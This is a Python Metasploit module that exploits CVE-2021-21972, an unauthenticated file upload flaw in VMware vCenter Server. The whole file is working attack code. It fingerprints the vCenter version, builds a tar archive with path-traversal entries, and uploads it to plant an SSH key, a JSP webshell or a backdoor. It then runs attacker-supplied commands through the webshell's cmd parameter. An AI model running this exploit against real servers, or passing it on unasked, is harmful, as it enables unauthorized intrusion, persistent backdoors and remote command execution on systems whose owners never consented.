#!/usr/bin/env python3
from metasploit import module

dependencies_missing = False
try:
    import os,tarfile,sys,optparse,requests,time

except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'VMware vCenter Server - Unauthenticated File Upload',
    'description': '''
    CVE-2021-21972 is an unauthenticated file upload and overwrite,
    exploitation can be done via SSH public key upload or a webshell
    The webshell must be of type JSP, and its success depends heavily on the specific vCenter version
    ''',
    'authors': ["Photubias","Taroballz","ITRI-PTT"],
    'references': [
        {"type":"edb","ref":"49602"},
        {"type":"cve","ref":"2021-21972"}
    ],
    'date': "2021-03-06",
    "type": "remote_exploit_cmd_stager",
    "targets": [
        {"platform": "win", 'arch': "x86"},
        {"platform": "linux", 'arch': "x86"},
    ],
    "payload": {
        "command_stager_flavor": "wget",
    },
    "privileged": False,
    "options": {
        'rhost': {'type': 'address', 'description': "Target address", 'required': True, 'default': None},
        "port":{"type":"int","description":"port","required":True,"default":443},
        'rssl': {"type":"bool","description":"Negotiate SSL for outgoing connections","required":True, "defeault":True},
        'rfile': {"type":"string","description":"file to upload: e.g. id_rsa.pub in case of ssh or webshell.jsp in case of webshell","required":True, "defeault":"./shell.jsp"},
        'rpath': {"type":"string","description":'specify absolute remote path, e.g. /tmp/testfile or /Windows/testfile',"required":False, "defeault":None},
        "rtype": {"type":"string","description":"ssh/webshell, default: ssh","required":True,"default":"webshell"},
        "command": {"type": "string", 'description': 'The command to execute via the q GET parameter', 'required': True}
    }
}
SM_TEMPLATE = b'''<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>'''

sURL = None
sType = None

def getVersion(sURL):
    def getValue(sResponse, sTag='vendor'):
        try:
            return sResponse.split('<' + sTag + '>')[1].split('</' + sTag + '>')[0]
        except:
            pass
        return ''

    oResponse = requests.post(sURL + '/sdk', verify=False, timeout=5, data=SM_TEMPLATE)
    module.log(oResponse.text,"info")
    if oResponse.status_code == 200:
        sResult = oResponse.text
        if not 'VMware' in getValue(sResult, 'vendor'):
            module.log("Not a VMware system: " + sURL,"error")
            return
        else:
            sName = getValue(sResult, 'name')
            sVersion = getValue(sResult, 'version')  # e.g. 7.0.0
            sBuild = getValue(sResult, 'build')  # e.g. 15934073
            sFull = getValue(sResult, 'fullName')
            module.log('Identified: ' + sFull,"good")
            return sVersion, sBuild
    module.log("Not a VMware system: " + sURL, "error")
    sys.exit()


def verify(sURL):
    oResponse = None
    sURL += '/ui/vropspluginui/rest/services/uploadova'
    try:
        oResponse = requests.get(sURL, verify=False, timeout=5)
    except:
        module.log('System not available: ' + sURL,"error")
    if oResponse.status_code == 405:
        return True  ## A patched system returns 401, but also if it is not booted completely
    else:
        return False

def createTarLin(sFile, sType, sVersion, sBuild, sRpath = None):
    def getResourcePath():
        oResponse = requests.get(sURL + '/ui', verify=False, timeout=5)
        return oResponse.text.split('static/')[1].split('/')[0]
    oTar = tarfile.open('payloadLin.tar','w')
    if sRpath: ## version & build not important
        if sRpath[0] == '/': sRpath = sRpath[1:]
        sPayloadPath = '../../' + sRpath
        oTar.add(sFile, arcname=sPayloadPath)
        oTar.close()
        return 'absolute'
    elif sType.lower() == 'ssh': ## version & build not important
        sPayloadPath = '../../home/vsphere-ui/.ssh/authorized_keys'
        oTar.add(sFile, arcname=sPayloadPath)
        oTar.close()
        return 'ssh'
    elif (int(sVersion.split('.')[0]) == 6 and int(sVersion.split('.')[1]) == 5) or (int(sVersion.split('.')[0]) == 6 and int(sVersion.split('.')[1]) == 7 and int(sBuild) < 13010631):
        ## vCenter 6.5/6.7 < 13010631, just this location with a subnumber
        sPayloadPath = '../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/' + os.path.basename(sFile)
        module.log('Selected uploadpath: ' + sPayloadPath[5:],'info')
        for i in range(112): oTar.add(sFile, arcname=sPayloadPath % i)
        oTar.close()
        return 'webshell'
    elif (int(sVersion.split('.')[0]) == 6 and int(sVersion.split('.')[1]) == 7 and int(sBuild) >= 13010631):
        ## vCenter 6.7 >= 13010631, webshell not an option, but backdoor works when put at /usr/lib/vmware-vsphere-ui/server/static/resources/libs/<thefile>
        sPayloadPath = '../../usr/lib/vmware-vsphere-ui/server/static/resources/libs/' + os.path.basename(sFile)
        module.log('Selected uploadpath: ' + sPayloadPath[5:],'info')
        oTar.add(sFile, arcname=sPayloadPath)
        oTar.close()
        return 'backdoor'
    else: #(int(sVersion.split('.')[0]) == 7 and int(sVersion.split('.')[1]) == 0):
        ## vCenter 7.0, backdoor webshell, but dynamic location (/usr/lib/vmware-vsphere-ui/server/static/resources15863815/libs/<thefile>)
        sPayloadPath = '../../usr/lib/vmware-vsphere-ui/server/static/' + getResourcePath() + '/libs/' + os.path.basename(sFile)
        module.log('[!] Selected uploadpath: ' + sPayloadPath[5:],'info')
        oTar.add(sFile, arcname=sPayloadPath)
        oTar.close()
        return 'backdoor'

def createTarWin(sFile, sRpath = None):
    ## vCenter only (uploaded as administrator), vCenter 7+ did not exist for Windows
    if sRpath:
        if sRpath[0] == '/': sRpath = sRpath[:1]
        sPayloadPath = '../../' + sRpath
    else:
        sPayloadPath = '../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/' + os.path.basename(sFile)
    oTar = tarfile.open('payloadWin.tar','w')
    oTar.add(sFile, arcname=sPayloadPath)
    oTar.close()

def uploadFile(sURL, sUploadType, sFile):
    sFile = os.path.basename(sFile)
    sUploadURL = sURL +  '/ui/vropspluginui/rest/services/uploadova'
    arrLinFiles = {'uploadFile': ('1.tar', open('payloadLin.tar', 'rb'), 'application/octet-stream')}
    ## Linux
    oResponse = requests.post(sUploadURL, files = arrLinFiles, verify=False)
    if oResponse.status_code == 200:
        if oResponse.text == 'SUCCESS':
            module.log('Linux payload uploaded succesfully.','good')
            if sUploadType == 'ssh':
                module.log('SSH key installed for user \'vsphere-ui\'.','good')
                module.log('     Please run \'ssh -i ~/.ssh/id_rsa vsphere-ui@' + sURL[:sURL.find(":",len("'https://'"))].replace('https://','') + '\'','info')
                return True
            elif sUploadType == 'webshell':
                global sWebshell
                sWebshell = sURL + '/ui/resources/' + sFile
                #print('testing ' + sWebshell)
                oResponse = requests.get(sWebshell, verify=False)
                if oResponse.status_code != 404:
                    module.log('Webshell verified, please visit: ' + sWebshell,"good")
                    return True
            elif sUploadType == 'backdoor':
                sWebshell = sURL + '/ui/resources/' + sFile
                module.log('Backdoor ready, please reboot or wait for a reboot','good')
                module.log('     then open: ' + sWebshell,"good")
            else: ## absolute
                pass
    ## Windows
    arrWinFiles = {'uploadFile': ('1.tar', open('payloadWin.tar', 'rb'), 'application/octet-stream')}
    oResponse = requests.post(sUploadURL, files=arrWinFiles, verify=False)
    if oResponse.status_code == 200:
        if oResponse.text == 'SUCCESS':
            module.log('Windows payload uploaded succesfully.','good')
            if sUploadType == 'backdoor':
                module.log('Absolute upload looks OK',"good")
                return True
            else:
                sWebshell = sURL + '/statsreport/' + sFile
                oResponse = requests.get(sWebshell, verify=False)
                if oResponse.status_code != 404:
                    module.log('Webshell verified, please visit: ' + sWebshell,"good")
                    return True
    return False


def run(args):
    global sURL

    if dependencies_missing:
        module.log("Module dependencies (requests) missing, cannot continue", level="error")
        return

    # modify URL
    sURL = args['rhost']
    if sURL[-1:] == '/': sURL = sURL[:-1]
    if not sURL[:4].lower() == 'http':
        if args["rssl"]=="true":
            sURL = 'https://' + sURL + ":" + args["port"]
        else:
            sURL = "http://" + sURL + ":" + args["port"]

    module.log("ExpUrl is {}".format(sURL))

    try:
        ## Verify
        if verify(sURL=sURL):
            module.log("Target vulnerable: "+sURL,"good")
        else:
            module.log('Target not vulnerable: ' + sURL,"error")
            return

        ## Read out the version
        sVersion, sBuild = getVersion(sURL)
        if args["rpath"]:
            module.log('Ready to upload your file to ' + args["rpath"],"info")
        elif args["rtype"].lower() == 'ssh':
            module.log('Ready to upload your SSH keyfile \'' + args["rfile"] + '\'')
        else:
            module.log('Ready to upload webshell \'' + args["rfile"] + '\'')

        ## Create TAR file
        sUploadType = createTarLin(args["rfile"], args["rtype"], sVersion, sBuild, args["rpath"])
        if not sUploadType == 'ssh': createTarWin(args["rfile"], args["rpath"])

        ## Upload and verify
        uploadFile(sURL, sUploadType, args["rfile"])

        ## Cleanup
        try:
            os.remove('payloadLin.tar')
            os.remove('payloadWin.tar')
        except Exception as e:
            module.log(str(e), "info")

        ## request reverse shell
        if args["rtype"] == "webshell":
            # module.log(args["command"])
            commandlist = args["command"].split(";")
            for c in commandlist:
                if "+x" in c:
                    c = c.replace("+x","777")
                # module.log(sWebshell+"?cmd={}".format(c))
                try:
                    requests.get(sWebshell+"?cmd={}".format(c),verify=False,timeout=20)
                    time.sleep(20)
                except Exception as e:
                    module.log(str(e))
            # else:
            #     module.log("all command done")

    except Exception as e:
        module.log(str(e),"info")


if __name__ == '__main__':
    module.run(metadata, run)